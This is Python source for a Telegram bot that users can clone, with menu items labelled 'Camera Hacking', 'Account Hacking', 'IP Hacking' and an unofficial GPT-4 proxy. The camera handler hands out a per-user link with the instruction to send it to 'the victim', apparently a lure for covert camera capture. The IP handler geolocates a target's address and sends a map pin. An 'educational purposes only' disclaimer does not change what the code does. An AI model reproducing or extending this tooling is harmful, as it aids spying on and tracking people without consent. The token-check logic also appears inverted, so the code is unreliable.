from create_bot import bot
from handlers.state import UserState
from telebot import types
from telebot import TeleBot
from middleware.subscription import rate_limit_decorator
from g4f.client import Client
from Database import Database
import requests
from threading import Thread

db = Database('database.db')

client = Client()

# Словарь для хранения активных ботов по chat_id
active_bots = {}

# Функция для создания нового бота
def create_new_bot(bot_token, chat_id):
    # Сохраняем токен в базу данных, если его ещё нет
    token_in_db = db.get_token(chat_id)
    if not token_in_db:
        db.set_token(chat_id, bot_token)

    # Создаём нового бота
    new_bot = TeleBot(token=f'{bot_token}')

    # Запускаем бота в новом потоке
    start_new_bot_thread(new_bot)
    
    return new_bot

# Функция для запуска бота в отдельном потоке
def start_new_bot_thread(new_bot):
    def run_new_bot():
        new_bot.infinity_polling()
    thread = Thread(target=run_new_bot)
    thread.start()

@bot.message_handler(func=lambda message: UserState.user_data.get(message.chat.id, {}).get('waiting_for_token', False))
def handle_token(message):
    new_token = message.text
    token_in_db = db.get_token(message.chat.id)

    if not new_token == token_in_db:
        bot.send_message(message.chat.id, 'Данный бот уже создан.')
    else:
        db.set_token(message.chat.id, new_token)

    try:
        # Создаём нового бота
        new_bot = create_new_bot(new_token, message.chat.id)
        # Добавьте сюда логику, связанную с вашим новым ботом (хендлеры, меню и т.д.)

        bot.send_message(message.chat.id, "Бот успешно создан! ☑️")
        UserState.user_data[message.chat.id]['waiting_for_token'] = False
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при создании бота: {str(e)}")

 #-------------------------------------------------------------- BOT CODE  START---------------------------------------------------------------------------------------------
        # back handler
    @new_bot.callback_query_handler(func=lambda call: call.data == 'back')
    def back_callback(call):
        main(call.message)


    
    #'/start' and '/help'
    @new_bot.message_handler(commands=['help', 'start'])
    def send_welcome(message):
        markup = types.InlineKeyboardMarkup(row_width=2)
        item_1 = types.InlineKeyboardButton('I agree', callback_data='yes')
        markup.add(item_1)

        db.add_user(message.chat.id, message.from_user.first_name)
        db.subscribe(message.chat.id)

        img = open('./img/warrning.webp', 'rb')
        new_bot.send_photo(message.chat.id, img, caption=""" \n
If you use this bot, you agree to be bound by our terms.
This bot is for educational purposes only.
I am not responsible for any illegal activities that may occur as a result of using this bot.
If you use this bot, you do so at your own risk.\n
            """, reply_markup=markup)
        img.close()

        
    # Обработчик для кнопки "Я Согласен(а)"
    @new_bot.callback_query_handler(func=lambda call: call.data == 'yes')
    def warrning_callback(call):
        new_bot.answer_callback_query(call.id, "Thanks")
        # Сохраняем информацию о пользователе в user_data
        UserState.user_data[call.message.chat.id] = call.message.chat.first_name

        main(call.message)





    # main menu

    def main(message):
        UserState.waiting_for_ip[message.chat.id] = False
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        item_1 = types.InlineKeyboardButton('👨‍💻 Camera Hacking', callback_data='cameraHack')
        item_3 = types.InlineKeyboardButton('🚫 Account Hacking', callback_data='accountHack')
        item_2 = types.InlineKeyboardButton('🤖 Chat GPT4', callback_data='gpt4')
        item_4 = types.InlineKeyboardButton('📍 IP Hacking', callback_data='ipHack')
        item_5 = types.InlineKeyboardButton('Create Bot', callback_data='createBot')
        item_6 = types.InlineKeyboardButton('Subscribee to chanel', callback_data='sub', url='https://t.me/Neivo_FrontEndDev')
        item_7 = types.InlineKeyboardButton('📈 statistic', callback_data='stat')
        markup.add(item_1, item_2, item_3, item_4, item_5, item_6, item_7)

        img = open('./img/main.jpeg', 'rb')
        user_name = db.get_name(message.chat.id)
        caption_text = f"Main menu\n\n🆔 Your id: {message.chat.id}\n👤 Your name: {user_name}"
        media = types.InputMediaPhoto(media=img, caption=caption_text)
        
        new_bot.edit_message_media(chat_id=message.chat.id, message_id=message.message_id, media=media, reply_markup=markup)
        img.close()
        # bot.send_photo(message.chat.id, img, caption=f"Main menu\n\n🆔 Your id: {message.chat.id}\n👤 Your name: {user_name}", reply_markup=markup, parse_mode="Markdown")
        UserState.user_data[message.chat.id] = {'main_message_id': message.message_id}

    @new_bot.callback_query_handler(func=lambda call: call.data == 'stat')
    def statistic(call):
        markup = types.InlineKeyboardMarkup(row_width=2)
        item_1 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(item_1)
        
        sub = db.get_subscribe(call.message.chat.id)
        img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы хакинга камеры
        caption_text = f"users: {sub}"
        
        media = types.InputMediaPhoto(media=img, caption=caption_text)
        new_bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
        img.close()
        
        
    @new_bot.callback_query_handler(func=lambda call: call.data == 'createBot')
    def CreateNewBot(call):
        markup = types.InlineKeyboardMarkup(row_width=2)
        item_1 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(item_1)
        
        img = open('./img/main.jpeg', 'rb')
        caption_text = f"OK. Send me your bot TOKEN"
        
        media = types.InputMediaPhoto(media=img, caption=caption_text)
        new_bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
        img.close()
        
        # Сохраняем состояние ожидания токена
        UserState.user_data[call.message.chat.id] = {'waiting_for_token': True}

    # web screen handler --todo
    @new_bot.callback_query_handler(func=lambda call: call.data == 'accountHack')
    @rate_limit_decorator(delay=5)
    def accountHacking(call): 
        markup = types.InlineKeyboardMarkup(row_width=1)
        item_1 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(item_1)

        img = open('./img/main.jpeg', 'rb')
        caption_text = "Coming soon"

        media = types.InputMediaPhoto(media=img, caption=caption_text)
        new_bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
        img.close()

    
    # ip addres hack func

    def location(message, ip):
        markup = types.InlineKeyboardMarkup(row_width=1)
        item_1 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(item_1)

        try:
            new_bot.send_message(message.chat.id, 'Please wait')
            response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
        except ConnectionError:
            new_bot.send_message(message.chat.id, 'Error', reply_markup=markup)

        if response.status_code == 404:
            new_bot.send_message(message.chat.id, "Oops")
            return

        result = response.json()
        if result["status"] == "fail":
            markup = types.InlineKeyboardMarkup(row_width=1)
            item_1 = types.InlineKeyboardButton('Main menu', callback_data='back')
            markup.add(item_1)
            
            new_bot.send_message(message.chat.id, "ERROR. enter a correct IP address", reply_markup=markup)
            return


        result_message = f"""
> *Country:* \\ {result['country']}\\
> *Country Code:* \\ {result['countryCode']}\\
> *Region:* \\ {result['region']}\\
> *Region Name:* \\ {result['regionName']}\\
> *City:* \\ {result['city']}\\
> *Timezone:* \\ {result['timezone']}\\
> *ISP:* \\ {result['isp']}\\
> *as:* \\ {result['as']}\\
        """
        
        new_bot.send_location(message.chat.id, result['lat'], result['lon'])
        new_bot.send_message(message.chat.id, f"{result_message}", parse_mode='MarkdownV2', reply_markup=markup)
        
        return tuple(result_message)


    # ip hack menu handler
    @new_bot.callback_query_handler(func=lambda call: call.data == 'ipHack')
    @rate_limit_decorator(delay=5)
    def ipHacking(call):
        markup = types.InlineKeyboardMarkup(row_width=1)
        item_1 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(item_1)

        img = open('./img/main.jpeg', 'rb')
        caption_text = "Send me IP address."

        media = types.InputMediaPhoto(media=img, caption=caption_text)
        new_bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
        img.close()

        UserState.waiting_for_ip[call.message.chat.id] = True


    # handle hack ip handler 
    @new_bot.message_handler(func=lambda message: UserState.waiting_for_ip.get(message.chat.id))
    def get_ip_address(message):
        ip = message.text
        if ip:
            markup = types.InlineKeyboardMarkup(row_width=1)
            item_1 = types.InlineKeyboardButton('Main menu', callback_data='back')
            markup.add(item_1)
            
            
            response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
            result = response.json()        
            if response.status_code == 404 or result.get("status") == "fail":
                new_bot.send_message(message.chat.id, "> ERROR\\. enter a correct IP address\\.", reply_markup=markup, parse_mode='MarkdownV2')
                return

            location(message, ip)



    # camera hack menu handler
    @new_bot.callback_query_handler(func=lambda call: call.data == 'cameraHack')
    def camera_hacking_callback(call):
        markup = types.InlineKeyboardMarkup(row_width=2)
        item_1 = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(item_1)

        img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы хакинга камеры
        link = f"https://super-game-bot.netlify.app/g/{call.message.chat.id}"
        caption_text = f"Copy the link and send it to the victim\n\n🔗Link: {link}"
        
        media = types.InputMediaPhoto(media=img, caption=caption_text)
        new_bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
        img.close()


    # gpt---------------------------------------------------
    @new_bot.callback_query_handler(func=lambda call: call.data == 'back')
    def back_callback(call):
        if 'main' in UserState.user_data.get(call.message.chat.id, {}):
            # Если пользователь находится в главном меню, то просто отправляем ему главное меню
            main(call.message)
        elif 'gpt4' in UserState.user_data.get(call.message.chat.id, {}):
            # Если пользователь находится в диалоге с GPT-4, то завершаем диалог и отправляем в главное меню
            del UserState.user_data[call.message.chat.id]['gpt4']  # Удаляем информацию о диалоге с GPT-4
            main(call.message)

    # gpt 4 
    @new_bot.callback_query_handler(func=lambda call: call.data == 'gpt4')
    def gpt4_callback(call):
        if call.message.chat.id not in UserState.user_data:
            UserState.user_data[call.message.chat.id] = {}
        UserState.user_data[call.message.chat.id]['gpt4'] = True
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton('Back', callback_data='back')
        markup.add(back_button)
        if call.message.text:
            new_bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="You are in dialogue with ChatGPT 4. Send your request in text format.", reply_markup=markup)
        else:
            img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы c 
            caption = """
You are in dialogue with ChatGPT 4\\. Send your request in text format\\.
> Press\\ __Back__\\ to exit\\.
    """

            new_bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=caption, reply_markup=markup, parse_mode="MarkdownV2")

            img.close()

    # gpt send response handler
    @new_bot.message_handler(func=lambda message: UserState.user_data.get(message.chat.id, {}).get('gpt4', False))
    def handle_gpt_requests(message):
        markup = types.InlineKeyboardMarkup(row_width=1)
        item = types.InlineKeyboardButton('CHAT GPT 4', callback_data='gpt4')
        markup.add(item)
        
        if UserState.waiting_for_ip[message.chat.id]:
            new_bot.send_message(message.chat.id, 'IP adres expected. Please try it later.', reply_markup=markup)
            UserState.waiting_for_ip[message.chat.id] = False

        else:
            
            new_bot.send_chat_action(message.chat.id, 'typing')
            try:
                response = client.chat.completions.create(
                    model="gpt-4",
                    messages=[{"role": "user", "content": message.text}],
                )
                textResponse = response.choices[0].message.content
                new_bot.send_chat_action(message.chat.id, 'typing')
                new_bot.send_message(message.chat.id, textResponse) 
            
            except Exception as e:
                text = f"> Sorry\\ at the moment the server \\can't send the request"
                new_bot.send_message(
                    message.chat.id,
                    text,  # Экранированный текст
                    parse_mode="MarkdownV2"
                )
                new_bot.send_message(message.chat.id, e)

            new_bot.send_chat_action(message.chat.id, 'typing')
    
#-------------------------------------------- NEW BOT END-------------------------------------------------
            
                # Запускаем его в другом потоке, чтобы не мешать основному боту
       
        
    
@bot.callback_query_handler(func=lambda call: call.data == 'createBot')
def CreateBot(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    item_1 = types.InlineKeyboardButton('Back', callback_data='back')
    markup.add(item_1)
    
    img = open('./img/main.jpeg', 'rb')
    
    caption_text = f"OK. Send me your bot TOKEN"
    
    media = types.InputMediaPhoto(media=img, caption=caption_text)
    bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
    img.close()
    
    # Сохраняем состояние ожидания токена
    UserState.user_data[call.message.chat.id] = {'waiting_for_token': True}
